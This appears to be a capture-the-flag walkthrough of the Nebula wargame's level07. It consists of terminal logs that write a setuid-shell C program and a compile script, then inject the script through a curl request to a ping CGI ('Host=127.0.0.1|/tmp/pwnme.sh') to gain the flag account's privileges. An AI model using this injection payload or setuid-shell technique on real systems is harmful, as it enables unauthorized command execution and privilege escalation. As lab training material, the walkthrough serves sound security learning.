```
level07@nebula:~$ cd /home/flag07
level07@nebula:/home/flag07$ ls -la
total 10
drwxr-x--- 2 flag07 level07  102 2011-11-20 20:39 .
drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ..
-rw-r--r-- 1 flag07 flag07   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag07 flag07  3353 2011-05-18 02:54 .bashrc
-rwxr-xr-x 1 root   root     368 2011-11-20 21:22 index.cgi
-rw-r--r-- 1 flag07 flag07   675 2011-05-18 02:54 .profile
-rw-r--r-- 1 root   root    3719 2011-11-20 21:22 thttpd.conf
level07@nebula:/home/flag07$ grep port thttpd.conf
# Specifies an alternate port number to listen on.
port=7007
# all hostnames supported on the local machine. See thttpd(8) for details.
level07@nebula:/home/flag07$ cat <<EOF> /tmp/pwnme.c
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *args[] = {"/bin/sh", NULL};
  setuid(geteuid());
  setgid(getegid());
  execve(args[0],args, envp);
  return 0;
}
EOF
level07@nebula:/home/flag07$ cat > /tmp/pwnme.sh
#!/bin/bash
/usr/bin/gcc /tmp/pwnme.c -o /home/flag07/flag07sh
chmod 4755 /home/flag07/flag07sh
level07@nebula:/home/flag07$ chmod +x /tmp/pwnme.sh
```
```
root@kalibuntu:~/nebula/level07# curl "http://192.168.112.151:7007/index.cgi?Host=127.0.0.1|/tmp/pwnme.sh"
<html><head><title>Ping results</title></head><body><pre></pre></body></html>
```
```
level07@nebula:~$ ls -la /home/flag07/flag07sh 
-rwsr-xr-x 1 flag07 flag07 7315 2016-01-03 16:44 /home/flag07/flag07sh
level07@nebula:~$ /home/flag07/flag07sh 
sh-4.2$ id
uid=1008(level07) gid=1008(level07) euid=992(flag07) groups=992(flag07),1008(level07)
sh-4.2$ getflag
You have successfully executed getflag on a target account

```
